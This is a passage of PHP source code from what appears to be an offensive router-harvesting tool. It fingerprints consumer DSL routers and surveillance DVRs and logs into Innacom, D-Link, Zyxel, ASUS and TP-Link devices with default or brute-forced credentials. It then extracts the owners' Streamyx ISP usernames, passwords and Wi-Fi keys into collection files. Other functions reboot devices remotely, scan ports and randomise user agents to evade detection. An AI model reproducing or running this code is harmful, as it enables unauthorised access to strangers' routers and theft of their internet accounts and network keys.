    foreach ($r_r as $id => $link) {
      $curly[$id] = curl_init();
      curl_setopt ($curly[$id], CURLOPT_URL, $link);
      curl_setopt ($curly[$id], CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($curly[$id], CURLOPT_TIMEOUT, $timeout);
      curl_setopt ($curly[$id], CURLOPT_USERAGENT, random_user_agent()); // ;)
      if (!empty ($options)) {
        curl_setopt_array ($curly[$id], $options);
      }
      curl_multi_add_handle ($mh, $curly[$id]);
    }
    $running = null;
    do {
      curl_multi_exec ($mh, $running);
    }
    while ($running > 0);
    foreach ($curly as $id => $c) {
      $result[$id] = curl_multi_getcontent ($c);
      curl_multi_remove_handle ($mh, $c);
    }
    curl_multi_close ($mh);
    
    // merge the output into $collect_data_scan
    $collect_data_scan = array_merge ($collect_data_scan, $result);
  }
  
  // return scanned result.. ;)
  return $collect_data_scan;
}
 
//
// Old version of check
// to check if single host is on-line or not only..
//
function check_old ($url) {
  $ch = curl_init();
  curl_setopt ($ch, CURLOPT_URL,$url );
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_VERBOSE,false);
  curl_setopt ($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt ($ch, CURLOPT_SSLVERSION,3);
  curl_setopt ($ch, CURLOPT_USERAGENT, random_user_agent());
  curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  $page = curl_exec ($ch);
  $httpcode = curl_getinfo ($ch, CURLINFO_HTTP_CODE);
  curl_close ($ch);
  if ($httpcode>=200 && $httpcode<402) return true;
  else return false;
}

//
// This function will verify scanned data..
// you can add your own signature here..
//
function checkdata ($data, $ip = "") {

  if (strpos ($data, "parent.location=")) { // For IP that move to other location ;)
    $pecah = explode("parent.location='", $data);
    $pecah = explode("'", $pecah[1]);
    $get = http_request ($pecah[0], "", "");
    if (strpos ($get, "Innacom")) {
      return "Innacom";
    } else if (strpos ($get, "logo_dlink.jpg")) {
      return "DSL-2640B Wireless Router";
    } else if (strpos ($get, "DSL-2750U")) {
      return "DSL-2750U";
    }
  } else if (strpos ($data, "<A HREF='/login.rsp'>here</a></")) {
    $pecah = cutstr ($data, "HREF='", "'");
    $get = http_request ($ip.$pecah);
    if (strpos ($get, "DVR LOGIN")) {
      return "DVR LOGIN";
    }
  } else if (strpos ($data, "Asus")) {
    return "ASUS DSL-N12U";
  } else if (strpos ($data, "TD-W8901G")) {
    return "TP-Link TD-W8901G";
  } else if (strpos ($data, "D-Link")) {
    return "D-Link";
  } else if (strpos ($data, "TM6841G")) {
    return "Zyxel P-600";
  } else if (strpos ($data, "DVR remote management sytem")) {
    return "DVR remote management system";
  } else if (strpos ($data, "IP Surveillance")) {
    return "IP Surveillance System";
  } else if (strpos ($data, "Net Viewer D6 Series Web-Program")) {
    return "Net Viewer D6 Series Web-Program";
  } else if (strpos ($data, "16 CH")) {
    return "16 CH (camera surveillance maybe ? :] )";
  } else if (strpos ($data, "DVR Components Download")) {
    return "DVR Web Client/Camera";
  } else if (strpos ($data, '<img src="images/user.gif" width="32" height="48"></TD>')) {
    return "Web Camera";
  } else if (strpos ($data, "DVR LOGIN")) {
    return "DVR Camera Login";
  } else if (strpos ($data, "PC DVR Web Client")) {
    return "PC DVR Web Client";
  } else if (strpos ($data, "IDS_WEB_WEBCAM_LOGIN")) {
    return "Webcam Login";
  } else if (strpos ($data, "NETSuveillance WEB")) {
    return "NETSuveillance WEB";
  } else if (strpos ($data, "DSL Router")) {
    return "DSL Router";
  } else if (strpos ($data, 'id="btnLive" onClick="openLive()"')) {
    return "Remote Monitoring System";
  } else if (strpos ($data, "TD-W8961ND")) {
    return "TP-Link TD-W8961ND";
  } else if (strpos ($data, "Web Application Manager")) {
    return "Web Application Manager";
  } else if (strpos ($data, "BP Software")) {
    return "BP Software";
  } else if (strpos ($data, "BattleLAN Network")) {
    return "BattleLAN Network";
  } else if (strpos ($data, "WebDVR")) {
    return "WebDVR";
  } else if (strpos ($data, "RouterOS")) {
    return "RouterOS ";
  } else if (strpos ($data, "WebCam")) {
    return "WebCam";
  } else if (strpos ($data, "DVR-04CH")) {
    return "DVR-04CH";
  } else if (strpos ($data, " Network video client")) {
    return " Network video client";
  } else if (strpos ($data, "Streamyx Connection")) {
    return("Streamyx Connection Setup");
  }
}

//
// Rasdial function, only work with Windows OS !
//
function rasdial ($name, $username, $password) {
  if (strpos(shell_exec('rasdial "'.$name.'"'), 'error 623')) {
    return 'name';
  }
  $connect = shell_exec('rasdial "'.$name.'" "'.$username.'" "'.$password.'"');
  if (strpos ($connect, 'already connected')) {
    return 'already';
  } else if (strpos ($connect, 'error 691')) {
    return 'up';
  } else if (strpos ($connect, 'error 651')) {
    return '651';
  } else if (strpos ($connect, 'Successfully connected')) {
    return true;
  }
}

//
// To take data from Innacom router and do another task
// This function is written by Munajaf
//
function Innacom ($ip, $filesave = "", $wifi = false) {
  if (isset ($ip)) {
    global $list, $wifi_pass_collect, $autocollect_bool;
    global $wifi_pass_filename, $autocollect_filename, $autocollect_range;

    $result = ""; 

    $curl = http_request("http://{$ip}/login.cgi?username=support&psd=support", "", "");

    $login_back = false;

    //Using another verification
    if (strpos("Authentication fail", $curl)) {
      
      foreach ($list as $username => $pass) {
        $curl = http_request("http://{$ip}/login.cgi?username={$username}&psd={$pass}", "", "");
        if (strpos("Authentication fail", $curl) || strpos('parent.location=', $curl)) {
          continue;
        } else {
          $login_back = true;
          break;
        }
      }
    } else {
      $login_back = true;
    }
    
    if ($login_back == false) {
      return false;
    } else {
      $cook = GetCookies ($curl);
      $curl = http_request("http://{$ip}/wancfg.cmd", $cook, "");
       
      if (strpos ($curl, 'parent.location=') !== FALSE) return false;
      
      $curl1 = http_request("http://{$ip}/info.html", $cook, "");
      preg_match_all('/\{(.*?)\}/', cutstr ($curl, "obj2Items", "';"), $f);
      preg_match_all('/\"\<td\>(\d{3,6}?)\<\/td\>\"/', $curl1, $f1);
      if (!empty ($f[1][11]) && !empty ($f[1][12])) {
        $result .= " Streamyx User : ".$f[1][11]."\n";
        $result .= " Streamyx Pass : ".$f[1][12]."\n";
      }
      if (!empty ($f1[1][0]) && !empty ($f1[1][1])) {
        $result .= " Upstream : ".$f1[1][0]."\n";
        $result .= " Downstream : ".$f1[1][1]."\n";
      }
      else return false;

      //wifi
      $wifi_get = http_request("http://{$ip}/wlsecurity.html", $cook, "");
      $wifi_cut = cutstr ($wifi_get, "btnApply('wlsecrefresh.wl", "</select>");
      preg_match('/\<option\ value\=\'.*\'\>(.*?)\<\/option\>/', $wifi_cut, $ntwk_ssid);
      
      $ntwk_auth = '';
      $wifi_auth_shortkey = cutstr ($wifi_get, "mode = '", "';");
      $wifi_cut_auth = cutstr ($wifi_get, "wlAuthMode' size=", '</select>');
      preg_match_all('/value\=\".*\"\>.*\<\//', $wifi_cut_auth, $get_auth);
      
      foreach ($get_auth[0] as $auth_wifi) {
        if (strpos ($auth_wifi, $wifi_auth_shortkey)) {
          $ntwk_auth = cutstr ($auth_wifi, '">', '</');
        }
      }
      
      $ntwk_key = cutstr ($wifi_get, 'keys = new Array( "', '",');
      
      if ($wifi) {
        $result .= " Network SSID : ".$ntwk_ssid[1]."\n";
        $result .= " Network Auth : ".$ntwk_auth."\n";
        $result .= " Network Key : ".$ntwk_key."\n";
      }
      //end wifi

      

      if (!empty ($filesave) && !empty ($f[1][11])) {
        $data = array(
            "IP" => $ip,
            "Router" => "Innacomm",
            " Streamyx User" => $f[1][11],
            " Streamyx Pass" => $f[1][12],
            " Upstream" => $f1[1][0],
            " Downstream" => $f1[1][1]
            );
        if ($wifi) {
          $data = array_merge ($data, array(
              " Network SSID" => $ntwk_ssid[1],
              " Network Authentication" => $ntwk_auth,
              " Network Key" => $ntwk_key
              )
            );
        }
        file_put_contents ($filesave, "\r\n", FILE_APPEND);
        
        foreach ($data as $name => $value) {
          file_put_contents ($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
        }
      }
      
      if ($wifi_pass_collect) {
        if (!empty ($ntwk_key)) add_wifi_pass ($ntwk_key, $wifi_pass_filename);
      }
      
      if ($autocollect_bool && $f1[1][1] > $autocollect_range) {
        if (!empty($f[1][11]) && !empty($f[1][12])) {
          add_streamyx_id($f[1][11], $f[1][12], $autocollect_filename);
        }
      }
      
      http_request("http://{$ip}/logout.cgi", $cook, "");
      return $result;
    }
  }
}

//
// Innacom Reboot Function
//
function innacom_reboot ($ip) {

  global $list;

  $result = ""; 

  
  $curl = http_request("http://{$ip}/login.cgi?username=support&psd=support", "", "");
  
  $login_back = false;

  //Using another verification
  if (strpos("Authentication fail", $curl)) {
    
    foreach ($list as $username => $pass) {
      $curl = http_request("http://{$ip}/login.cgi?username={$username}&psd={$pass}", "", "");
      if (strpos("Authentication fail", $curl)) {
        continue;
      } else {
        $login_back = true;
        break;
      }
    }
  } else {
    $login_back = true;
  }
  if ($login_back != true) {
    
  } else {
    
    $cook = GetCookies ($curl);
    $reboot = http_request("http://{$ip}/rebootinfo.cgi", $cook);
    if (strpos ($reboot, "Router is rebooting")) { return true; } else { return false; }
  }
}

//
// D-Link Function
//
function dlink ($ip, $type, $filesave = "", $wifi = false) {

  global $list, $wifi_pass_collect, $autocollect_bool;
  global $wifi_pass_filename, $autocollect_filename, $autocollect_range;
 
  $pass = '';
  $result = "";

  if ($type == "SEA_1.01") { $User = "admin"; } else { $User = "tmadmin"; }
  
  //Login into Router
  $login = http_request("http://{$ip}/index.html", "username={$User};password=tmadmin", "username={$User}&password=tmadmin&loginfo=on");
  
  $login_back = false;
  
  //Using another verification
  if (strpos ($login, "auth_fail.html") !== FALSE) {
    
    foreach ($list as $username => $passs) {
      $login = http_request("http://{$ip}/index.html", "username={$User};password=".$passs, "username={$User}&password={$passs}&loginfo=on");
      if (strpos ($login, "auth_fail.html")) {
        continue;
      } else {
        $login_back = true;
        $pass = $passs;
        break;
      }
    }
  } else {
    $pass = 'tmadmin';
    $login_back = true;
  }
  
  if ($login_back != true) {
      
      return false;
  } else {
  
    
    
    // Find Username & Password
    $data = http_request("http://{$ip}/internet_js.html", "username={$User}; password=".$pass , "");
    preg_match_all('/ppp[A-Za-z]{7,8}\.value \= \'(.*?)\'\;/', $data, $userpass);
    //
    
    //Find Upstream & Downstream
    $data1 = http_request("http://{$ip}/info.html", "username={$User}; password=".$pass , "");
    preg_match_all('/<td>(\d{3,5}?)<\/td>/', $data1, $updown);
    //
    
    if (!empty ($userpass[1][0]) && !empty ($userpass[1][1])) {
      $result .= " Streamyx User : {$userpass[1][0]}\n";
      $result .= " Streamyx Pass : {$userpass[1][1]}\n";

    }
    if (!empty ($updown[1][1]) && !empty ($updown[1][0])) {
      $result .= " Upstream : {$updown[1][1]}\n";
      $result .= " Downstream : {$updown[1][0]}\n";
    }
    
    //Find Wifi Info..
    $data2 = http_request("http://{$ip}/info.html", "username={$User}; password=".$pass , "");
    
    // find wifi sec mode..
    $wlauthmode = cutstr ($data2, "wlauthmode = '", "';");
    $wep = cutstr ($data2, "wep = '", "';");
    if ($wep != 'disable') {
      $wifi_sec = 'WEP';
    } else {
      preg_match_all('/wlSecurity\[\d{1,3}\] \= new Gtab\(.*\)\;/', $data2, $out_sec);
      foreach ($out_sec[0] as $sec_mode) {
        if (strpos ($sec_mode, $wlauthmode)) {
          $wifi_sec = cutstr ($sec_mode, '", "', '");');
        }
      }
    }
    $wifi_ssid = cutstr ($data2, "wlSSID = '", "';");
    $data2 = http_request("http://{$ip}/wlcfgsecure.html", "username={$User}; password=".$pass , "");
    $wifi_key = cutstr ($data2, 'keys = new Array( "', '",');
    
    if ($wifi) {
      $result .= " Network SSID : {$wifi_ssid}\n";
      $result .= " Network Authentication : {$wifi_sec}\n";
      $result .= " Network Key : {$wifi_key}\n";
    }
    
    //end wifi
    
    
    
    if (!empty ($filesave) && !empty ($dl_user)) {
      $data = array(
          "IP" => $ip,
          "Router" => "D-Link Streamyx",
          " Streamyx User" => $userpass[1][0],
          " Streamyx Pass" => $userpass[1][1],
          " Upstream" => $updown[1][1],
          " Downstream" => $updown[1][0]
          );
      if ($wifi) {
        $data = array_merge ($data, array(
          " Network SSID" => $wifi_ssid,
          " Network Authentication" => $wifi_sec,
          " Network Key" => $wifi_key
          )
        );
      }
      file_put_contents ($filesave, "\r\n\r\n", FILE_APPEND);
      
      foreach ($data as $name => $value) {
        file_put_contents ($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
      }
    }
    
    if ($wifi_pass_collect) {
      if (!empty ($wifi_key)) add_wifi_pass ($wifi_key, $wifi_pass_filename);
    }
    
    if ($autocollect_bool && $dl_down > $autocollect_range) {
      if (!empty ($dl_user) && !empty ($dl_pass)) add_streamyx_id ($dl_user, $dl_pass, $autocollect_filename);
    }
    
    http_request("http://{$ip}/internet_js.html", "username=; password=" , "");
    return $result;
  }
}

//
// DLink Reboot
//
function dlink_reboot ($ip, $type) {

  global $list;
 
  $pass = '';
  $result = "";

  if ($type == "SEA_1.01") { $User = "admin"; } else { $User = "tmadmin"; }
  
  //Login into Router
  $login = http_request("http://{$ip}/index.html", "username={$User};password=tmadmin", "username={$User}&password=tmadmin&loginfo=on");
  
  $login_back = false;
  
  //Using another verification
  if (strpos ($login, "auth_fail.html") !== FALSE) {
      
      foreach ($list as $username => $passs) {
        $login = http_request("http://{$ip}/index.html", "username={$User};password=".$passs, "username={$User}&password={$passs}&loginfo=on");
        if (strpos ($login, "auth_fail.html") !== FALSE) {
          continue;
        } else {
          $login_back = true;
          $pass = $passs;
          break;
        }
      }
    } else {
      $pass = 'tmadmin';
      $login_back = true;
    }
  
  if ($login_back != true) {
      
  } else {
    //Send request to reboot Router
    
    $reboot = http_request("http://{$ip}/rebootinfo.cgi", "username={$User}; password=tmadmin" , "");
    if (strpos ($reboot, "Please wait...")) { return true; } else { return false; }
  }
}

//
// Zyxel P-600 Function
//
function zyxel ($ip, $filesave = "", $wifi = false) {

  global $list, $wifi_pass_collect, $autocollect_bool;
  global $wifi_pass_filename, $autocollect_filename, $autocollect_range;
  
  $result = "";
  
  //Login into Router
  $pst_tmp = "LoginUsername=tmadmin&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5("tmadmin")."&Prestige_Login=Login";
  $login = http_request("http://{$ip}/Forms/rpAuth_1", "", $pst_tmp, "");
  
  $login_back = false;
  
  //Using another verification
  if (strpos ($login, "rpAuth.html") !== FALSE) {
    
    foreach ($list as $username => $pass) {
      $pst_tmp = "LoginUsername={$username}&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5 ($pass)."&Prestige_Login=Login";
      $login = http_request("http://{$ip}/Forms/rpAuth_1", "", $pst_tmp, "");
      if (strpos ($login, "rpAuth.html") !== FALSE) {
        continue;
      } else {
        $login_back = true;
        break;
      }
    }
  } else {
    $login_back = true;
  }
  
  if ($login_back != true) {
    
  } else {
  
    // Find Username & Password
    
    $data = http_request("http://{$ip}/wzWAN_ManualCfg.html", "", "");
    preg_match_all('/\"wzWAN_TUserName.*value\=\"(.*?)\"/', $data, $username);
    preg_match_all('/\"wzWAN_TPassword.*value\=\"(.*?)\"/', $data, $password);
    //
    
    //Find Upstream & Downstream
    $data1 = http_request("http://{$ip}/home.html", "", "", "http://{$ip}/");
    preg_match_all('/DSL.* (\d{3,5}?) .*(\d{3,4}?) .*<\/td>/', $data1, $speed);
    //

    if (!empty ($username[1][0]) && !empty ($password[1][0])) {
      $result .= " Streamyx User : ".$username[1][0]."\n";
      $result .= " Streamyx Pass : ".$password[1][0]."\n";
    }
    if (!empty ($speed[1][0]) && !empty ($speed[2][0])) {
      $result .= " Upstream : ".$speed[2][0]."\n";
      $result .= " Downstream : ".$speed[1][0]."\n";
    }
    
    // find wifi
    
    $wifi_get = http_request("http://{$ip}/WLAN_General.html", "", "", "http://{$ip}/");
    
    $cut_wifikey = cutstr ($wifi_get, 'name="SecurityFlag', 'MAC Filter');
    preg_match('/maxlength\=\"\d{2,3}\" value\=\"([^\s*].*?)\"/', $cut_wifikey, $wifikey);
    $wifikey = $wifikey[1];
    
    preg_match('/value\=\"(.*?)\" onBlur\=\"chkName\(/', $wifi_get, $ssid);
    $ssid = $ssid[1];
    
    $cut_wifimode = cutstr ($wifi_get, '<select name="Security_Sel"', '</select>');
    preg_match('/\<option value\=.* selected>(.*?)\n/', $cut_wifimode, $wifimode);
    $wifimode = $wifimode[1];
    
    if ($wifi) {
      $result .= " Network SSID : {$ssid}\n";
      $result .= " Network Authentication : {$wifimode}\n";
      $result .= " Network Key : {$wifikey}\n";
    }
    // end wifi
    
    if (!empty ($filesave) && !empty ($username[1][0])) {
      $data = array(
          "IP" => $ip,
          "Router" => "Zyxel P-600",
          " Streamyx User" => $username[1][0],
          "Streamyx Pas" => $password[1][0],
          " Upstream" => $speed[2][0],
          " Downstream" => $speed[1][0]
          );
      if ($wifi) {
        $data = array_merge ($data, array(
          " Network SSID" => $ssid,
          " Network Authentication" => $wifimode,
          " Network Key" => $wifikey
          )
        );
      }
      file_put_contents ($filesave, "\r\n\r\n", FILE_APPEND);
      foreach ($data as $name => $value) {
        file_put_contents ($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
      }

    }
    
    if ($wifi_pass_collect) {
      if (!empty ($wifikey)) add_wifi_pass ($wifikey, $wifi_pass_filename);
    }
    
    if ($autocollect_bool && trim(str_replace("kbps", "", $speed_data[0])) > $autocollect_range) {
      if (!empty ($username[0]) && !empty ($password[0])) add_streamyx_id ($username[0], $password[0], $autocollect_filename);
    }
    
    http_request("http://{$ip}/Logout.html", "", "");
    return $result;
  }

}

//
// Zyxel Reboot
//
function zyxel_reboot ($ip) {
  
  global $list;
  
  $result = "";
  
  //Login into Router
  $pst_tmp = "LoginUsername=tmadmin&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5("tmadmin")."&Prestige_Login=Login";
  $login = http_request("http://{$ip}/Forms/rpAuth_1", "", $pst_tmp);
  
  $login_back = false;
  
  //Using another verification
  if (strpos ($login, "rpAuth.html") !== FALSE) {
    
    foreach ($list as $username => $pass) {
      $pst_tmp = "LoginUsername={$username}&LoginPassword=ZyXEL ZyWALL Series&hiddenPassword=".md5 ($pass)."&Prestige_Login=Login";
      $login = http_request("http://{$ip}/Forms/rpAuth_1", "", $pst_tmp);
      if (strpos ($login, "rpAuth.html") !== FALSE) {
        continue;
      } else {
        $login_back = true;
        break;
      }
    }
  } else {
    $login_back = true;
  }
  if ($login_back != true) {
    
  } else {
    
    $data_send = "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIq29nkXBv12Kj8h6"; //random data, but constant
    $data = http_request("http://{$ip}/Forms/rpSysReboot_1", "", "", "", $data_send);
    
    if (strpos ($data, "RebootSuccPrev")) {
      $data = http_request("http://{$ip}/RebootSuccPrev.html");
      $data = http_request("http://{$ip}/RebootSucc.html");
      return true;
    } else {
      return false;
    }
  }
}

//
// ASUS DSL-N12U Function
//
function asus ($ip, $filesave) {
  
  global $list;
  
  $result = "";

  //Login into Router and take data
  $login = http_request("http://{$ip}/Edit_Advanced_DSL_WAN_Config.asp?pvcindex=0&internetpvc=1", "", "", "admin:admin");

  //Using another verification
  if (strpos ($login, "401 Unauthorized") !== FALSE) {
    foreach ($list as $username => $pass) {
      $login = http_request("http://{$ip}/Edit_Advanced_DSL_WAN_Config.asp?pvcindex=0&internetpvc=1", "", "", $username.":".$pass);
      if (strpos ($login, "401 Unauthorized") === FALSE) {
          break;
      }
    }
  }
  
  //Find Username & Password
  
  $data = cutstr ($login, "DSLWANList", "]];");
  $username = cutstr ($data, '"0", "0", "', '"');
  $password = cutstr ($data , 'streamyx", "', '"');
  
  if (!empty ($username) && !empty ($password)) {
    $result .= " Streamyx User : {$username}\n";
    $result .= " Streamyx Pass : ".$password."\n";
  }
  
  
  
  if (!empty ($filesave) && !empty ($username)) {
    $data = array(
        "IP" => $ip,
        "Router" => "ASUS DSL-N12U",
        " Streamyx User" => $username,
        " Streamyx Pass" => $password
        );
    file_put_contents ($filesave, "\r\n\r\n", FILE_APPEND);
    foreach ($data as $name => $value) {
      file_put_contents ($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
    }
  }
  
  return $result;
  
}

//
// TP-Link Function
//
function TpLink ($ip, $filesave, $wifi = false) {

  global $list;
  
  $result = "";

  //Login into Router and take data
  $Bukak = http_request("http://{$ip}/wizard/wizardPPP.htm", "", "", "admin:admin");
  
  //Using another verification
  if (strpos ($Bukak, "401 Unauthorized")) {
    foreach ($list as $username => $pass) {
      $Bukak = http_request("http://{$ip}/wizard/wizardPPP.htm", "", "", $username.":".$password);
      if (strpos ($Bukak, "401 Unauthorized") === FALSE) {
        break;
      }
    }
  }
  
  //Find Username & Password
  
  preg_match_all('/NAME="Al_PPPUsername" (.*) VALUE="(.*)">/U', $Bukak, $Username);
  preg_match_all('/NAME="Al_PPPPassword" (.*) VALUE="(.*)">/U', $Bukak, $Password);
  
  // Find DownStream & UpStream
  $data = http_request("http://{$ip}/status/status_deviceinfo.htm", "", "", "admin:admin");
  $potong = cutstr ($data, "Data Rate", "kbps");
  $rate = explode(" ", $potong);
  
  if (!empty ($Username[2][0]) && !empty ($Password[2][0])) {
    $result .= " Streamyx User : ".$Username[2][0]."\n";
    $result .= " Streamyx Pass : ".$Password[2][0]."\n";
  }
  if (!empty ($rate[12]) && !empty ($rate[6])) {
    $result .= " Upstream : ".$rate[12]."\n";
    $result .= " Downstream : ".$rate[6]."\n";
  }
  
  
  
  if (!empty ($filesave) && !empty ($Username[2][0])) {
    $data = array(
        "IP" => $ip,
        "Router" => "TP-Link",
        " Streamyx User" => $Username[2][0],
        " Streamyx Pass" => $Password[2][0],
        " Upstream" => $rate[11],
        " Downstream" => $rate[6]
        );
        file_put_contents ($filesave, "\r\n\r\n", FILE_APPEND);
    foreach ($data as $name => $value) {
      file_put_contents ($filesave, "\r\n".$name." : ".$value, FILE_APPEND);
    }
  }
  
  return $result;
  
}

//
// TP-Link Reboot
//
function TpLink_reboot ($ip) {

  global $list;
  
  //Login into Router and take data
  $Bukak = http_request("http://{$ip}/wizard/wizardPPP.htm", "", "", "admin:admin");
  
  //Using another verification
  if (strpos ($Bukak, "401 Unauthorized")) {
    foreach ($list as $username => $pass) {
      $Bukak = http_request("http://{$ip}/wizard/wizardPPP.htm", "", "", $username.":".$password);
      if (strpos ($Bukak, "401 Unauthorized") === FALSE) { continue; }
    }
  }
  
  
  $reboot = http_request("http://{$ip}/Forms/tools_system_1", "", "restoreFlag=0&Restart=RESTART", "admin:admin");
  $reboot_data = http_request("http://{$ip}/progress.htm", "", "", "admin:admin");
  if (strpos ($reboot_data, "system is restarting")) { return true; } else { return false; }
}

//
// Function to get cookies from HTTP header
//
function GetCookies ($content) {
  preg_match_all('/Set-Cookie: (.*);/U',$content,$temp);
  $cookie = $temp[1];
  $cookies = implode('; ',$cookie);
  return $cookies;
}

//
// Function to cut downstream from given string
//
function getdownstream ($data) {
  return cutstr ($data, " Downstream : ", "\n");
}

//
// Function to check user limit
//
function limit ($down, $input) {
  if (strtolower ($input) == "4mb") {
    if ($down > 3900) return true;
  } else if (strtolower ($input) == "2mb") {
    if ($down > 1900) return true;
  } else if (strtolower ($input) == "8mb") {
    if ($down > 7800) return true;
  } else {
    return false;
  }
}

//
// Ping IP and get the time output result
// original article : http://www.planet-source-code.com/vb/scripts/ShowCode.asp?lngWId=8&txtCodeId=1786
//
function ping ($ip) {

  // Making the package
  $type= "\x08";
  $code= "\x00";
  $checksum= "\x00\x00";
  $identifier = "\x00\x00";
  $seqNumber = "\x00\x00";
  $data= "Scarface";
  $package = $type.$code.$checksum.$identifier.$seqNumber.$data;
  $packageTemp = $package;

  // calculate checksum
  if (strlen($packageTemp)%2) $packageTemp .= "\x00";
  $Funcbit = unpack('n*', $packageTemp);
  $Funcsum = array_sum($Funcbit);
  while ($Funcsum >> 16) $Funcsum = ($Funcsum >> 16) + ($Funcsum & 0xffff);
  $checksum = pack('n*', ~$Funcsum);
  //

  $package = $type.$code.$checksum.$identifier.$seqNumber.$data;
  // And off to the sockets
  $socket = socket_create(AF_INET, SOCK_RAW, 1);
  $cond = @socket_connect($socket, $ip, null);
  
  // check if host offline
  if(!$cond) echo "Unknown!";
  
  $startTime = microtime(true);
  socket_send($socket, $package, strLen($package), 0);
  if (socket_read($socket, 255)) $return = (round(microtime(true) - $startTime, 4));
  socket_close($socket);
  return ($return * 1000)."ms";

}

//
// Get Location of that IP address
// @param string $ip -> IP that need to get location
// @return string -> Return location
//
function get_geolocation ($ip) {

  // send request to find-ip-address.org server
  $data = http_request("http://www.find-ip-address.org/ip-address-locator.php", "", "scrollx=0&scrolly=300&ip=".$ip);
  
  // parse data respond using regex
  preg_match_all('/\<font color\=\'#980000\'\>(.*?)\<\/font\>/', $data, $pecah_string);
  
  $s_tmp = $pecah_string[1];
  
  if (!empty($s_tmp[2]) && !empty ($s_tmp[3])) {
    if (!empty ($s_tmp[2]) && empty ($s_tmp[3])) {
      return $s_tmp[2];
    } else if (empty ($s_tmp[2]) && !empty ($s_tmp[3])) {
      return $s_tmp[3];
    }else if ($s_tmp[2] == $s_tmp[3]) {
      return $s_tmp[2];
    } else {
      return $s_tmp[3].", ".$s_tmp[2];
    }
  } else {
    return "Unknown!";
  }
}

//
// Port scanner function
//
function port_scan ($host, $scan = '', $filesave='') {

  // empty variable ;))
  $first_r = $linern = $last_r = $range = $str_tmp = '';
  
  // list of common port
  $usual_port = array(
    21,22,23,25,53,80,110,115,135,139,
    143,194,389,443,445,1352,1433,3306,3389,5632,
    5900,6112,8080
  );
  
  
  if (!empty ($scan) && $scan != 'usual') {
  
    // if user put invalid range, then exit with error message
    if (strpos ($scan, '-') === false) die("\nInvalid port range!\n");
    // parse range here
    $scan = explode('-', $scan);
    $first_r = $scan[0];
    $last_r = $scan[1];
  }
  
  // if user don't define range, then use common port to scan
  $range = ( (empty ($first_r) || $scan == 'usual') ? $usual_port : range ($first_r, $last_r) );
  
  if (!empty ($filesave)) file_put_contents ($filesave, "\r\n", FILE_APPEND);
  
  // if user define to save result, then this section of code will do his task
  if (!empty ($filesave)) {
    $str_tmp = " Port : \r\n";
    echo $str_tmp;
    if (!empty ($filesave)) {
      file_put_contents ($filesave, $str_tmp, FILE_APPEND);
    }
  }
  
  // loop each of port and scan if host:port is online
  foreach ($range as $n => $port) {
  
    $scan_msg = "\rScanning port : ".$port;
    echo $scan_msg;
    // create connection with socket.. ( here the magic ;) )
    $connection = @fsockopen ($host, $port, $errno, $errstr, 1);
    // if connect success, then print out the port
    if (is_resource ($connection)) {
      clear_screen_buffer ($scan_msg); // clear previous message
      $linern = (($n == (count ($range)-1))?$linern = '':$linern = "\r\n"); // some magic
      // print out open port here..
      $str_tmp = '  '.$port.' open | Possible TCP Service : '.getservbyport ($port, 'tcp').$linern;
      echo $str_tmp;
        if (!empty ($filesave)) file_put_contents ($filesave, $str_tmp, FILE_APPEND);
    }
    fclose ($connection);
  }
  clear_screen_buffer ($scan_msg); // clear previous message
}

//
// This function will add wifi password into your defined file
//
function add_wifi_pass ($pass, $filename) {

  // if file doesn't exist, then create one
  if (!file_exists ($filename)) {
    file_put_contents ($filename, $pass);
    return 0;
    
  } else { // if exist, then start to save content there
  
    $get = file_get_contents ($filename);
    if (empty ($get)) {
      file_put_contents ($filename, $pass);
      return 0;
    } else {
      if (strpos ($get, $pass) !== false) {
        return 0;
      } else {
        file_put_contents ($filename, "\r\n".$pass, FILE_APPEND);
      }
    }
  }
}

//
// This function will add streamyx password into your defined file
//
function add_streamyx_id ($username, $pass, $filename) {

  // if file doesn't exist, then create one
  if (!file_exists ($filename)) {
    file_put_contents ($filename, $username.':'.$pass);
    return 0;
    
  } else { // if exist, then start to save content there
  
    $get = file_get_contents ($filename);
    if (empty ($get)) {
      file_put_contents ($filename, $username.':'.$pass);
      return 0;
    } else {
      if (strpos ($get, $username) !== false) {
        return 0;
      } else {
        file_put_contents ($filename, "\r\n{$username}:".$pass, FILE_APPEND);
      }
    }
  }
}

//
// Clear screen for previous message..
//
function clear_screen_buffer ($msg) {
  echo "\r";
  for ($i=0;$i<(strlen ($msg)+1);$i++) echo " ";
  echo "\r";
}

//
// This function generate random user agent each time its been call..
//
function random_user_agent () {
  $choice = rand(1,2);
  
  // if $choice == 1, then start to print google chrome dummy user agent
  if ($choice == 1) {
    $os = array(
      "Macintosh; Intel Mac OS X 10_8_3",
      "Windows NT 5.1",
      "Windows NT 6.1; WOW64",
      "X11; CrOS armv7l 2913.260.0",
      "X11; Linux x86_64",
      "X11; FreeBSD amd64",
      "Windows NT 6.2; WOW64",
      "Windows NT 6.1",
      "Macintosh; Intel Mac OS X 10_7_3",
      "Macintosh; Intel Mac OS X 10_6_8",
      "Macintosh; Intel Mac OS X 10_7_2",
      "Windows NT 6.0",
      "Windows; U; Windows NT 5.1; en-US",
      "Windows; U; Windows NT 6.1; en-US",
      "Macintosh; U; Intel Mac OS X 10_6_6; en-US",
      "X11; U; Linux i686; en-US",
      "Windows; U; Windows NT 6.1; en-US; Valve Steam GameOverlay; ",
    );
    $os_put = $os[rand(0, (count ($os)-1))];
    $appwebkit_v = rand(525,537).".".rand(0, 31);
    $chrome_version = rand(1, 31).".0.".rand(100, 1500).".".rand(20, 50);
    return "Mozilla/5.0 ({$os_put}) AppleWebKit/{$appwebkit_v} (KHTML, like Gecko) Chrome/{$chrome_version} Safari/".$appwebkit_v;
    
  } else {
    // if $choice == 2, then start to print firefox dummy user agent
    $os = array(
      "Macintosh; Intel Mac OS X 10.8; rv:24.0",
      "Windows NT 6.1; WOW64; rv:23.0",
      "Windows NT 6.1; rv:22.0",
